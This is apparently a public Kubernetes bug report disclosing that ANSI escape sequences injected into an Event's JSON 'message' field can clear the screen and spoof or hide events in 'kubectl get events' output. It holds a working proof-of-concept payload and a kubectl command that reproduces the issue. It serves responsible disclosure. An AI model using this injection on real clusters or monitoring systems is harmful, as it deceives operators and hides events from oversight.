It is a security issue, but after contacting [security@kubernetes.io](mailto:security@kubernetes.io), Tim and the team confirmed that they are comfortable posting it publicly.

#### What happened:

Kubernetes doesn't sanitize the 'message' field in the Event JSON objects.  
Notice that this is relevant only to JSON objects, not YAML objects.  
By creating new event, we can insert ANSI escape characters inside the "message" field, like:

    "\u001b[2J\u001b[3J\u001b[1;1H\u001b[m spoofed \u001b[60C\u001b[1;0m. Done"
    

This an example of such JSON request:

    {
        "apiVersion": "v1",
        "involvedObject": {
            "kind": "Node",
            "name": "node01",
            "uid": "node01"
        },
        "kind": "Event",
        "message": "\u001b[2J\u001b[3J\u001b[1;1H\u001b[m spoofed \u001b[60C\u001b[1;0m. Done",
        "metadata": {
            "name": "spoofEvent",
            "namespace": "default"
        },
        "source": {
            "component": "kubelet",
            "host": "node01"
        },
        "type": "Normal"
    }
    

The codes:  
`\u001b[2J` -> Clean the screen and history  
`\u001b[3J` -> Clean the entire screen and delete all lines saved in the scrollback buffer  
`\u001b[1;1H` -> Moves the cursor position to row 1, column 1 (beginning).  
`\u001b[m` -> Set the colors  
`\u001b[60C` -> Move the cursor forward 60 steps  
`\u001b[1;1m` -> Set the text colors to white

The result is that the text was spoofed, and we could spoof the events, create hidden events, or hide other events.

#### What you expected to happen:

The ANSI escape characters will be filtered so they couldn't affect the terminal (i.e. using embeded ANSI colors won't do anything to the terminal).  
Or maybe some message that says that you can't use ANSI escape characters.

#### How to reproduce it (as minimally and precisely as possible):

1.  Run this code:

    
    kubectl create -f - <<EOF
    {
        "apiVersion": "v1",
        "involvedObject": {
            "kind": "Node",
            "name": "node01",
            "uid": "node01"
        },
        "kind": "Event",
        "message": "\u001b[2J\u001b[3J\u001b[1;1H\u001b[m spoofed \u001b[60C\u001b[1;0m. Done",
        "metadata": {
            "name": "spoofEvent",
            "namespace": "default"
        },
        "source": {
            "component": "kubelet",
            "host": "node01"
        },
        "type": "Normal"
    }
    EOF
    

It will create a new event.

2.  Run `kubectl get events`, you will see that the screen was clear, you will get a "spoof" message, and all the rest events or columns were gone.

#### Anything else we need to know?:

It might look like a low severity issue, but there are other variety of things we can do, from DoS by using colors to hide all the events, changing the title of the terminal window, and spoof the data.

It can affect other systems that are using Kubernetes events, such as monitoring applications. It doesn't have to be only the Kubernetes events. There might be other vulnerable objects that we didn't find or other systems that create new objects that count on this mechanism.

ANSI escape characters were used to abuse terminals emulators and even cause code execution if the terminal is vulnerable (like [CVE-2003-0069](https://github.com/advisories/GHSA-cqhr-cfp6-qx66 "CVE-2003-0069")).

#### Environment:

-   Kubernetes version (use `kubectl version`):

    Client Version: version.Info{Major:"1", Minor:"20", GitVersion:"v1.20.4", GitCommit:"e87da0bd6e03ec3fea7933c4b5263d151aafd07c", GitTreeState:"clean", BuildDate:"2021-02-18T16:12:00Z", GoVersion:"go1.15.8", Compiler:"gc", Platform:"linux/amd64"}
    Server Version: version.Info{Major:"1", Minor:"20", GitVersion:"v1.20.2", GitCommit:"faecb196815e248d3ecfb03c680a4507229c2a56", GitTreeState:"clean", BuildDate:"2021-01-13T13:20:00Z", GoVersion:"go1.15.5", Compiler:"gc", Platform:"linux/amd64"}
    

-   Cloud provider or hardware configuration:
-   OS (e.g: `cat /etc/os-release`):

    NAME="Ubuntu"
    VERSION="16.04.7 LTS (Xenial Xerus)"
    ID=ubuntu
    ID_LIKE=debian
    PRETTY_NAME="Ubuntu 16.04.7 LTS"
    VERSION_ID="16.04"
    HOME_URL="http://www.ubuntu.com/"
    SUPPORT_URL="http://help.ubuntu.com/"
    BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
    VERSION_CODENAME=xenial
    UBUNTU_CODENAME=xenial
    

-   Kernel (e.g. `uname -a`):

    Linux manager1 4.15.0-140-generic #144~16.04.1-Ubuntu SMP Fri Mar 19 21:24:12 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
    

-   Install tools: minikube

    minikube version: v1.19.0
    commit: 15cede53bdc5fe242228853e737333b09d4336b5
    

-   Network plugin and version (if this is a network-related bug):
-   Others: we also reproduced it in Kubernetes (not minikube) version 1.18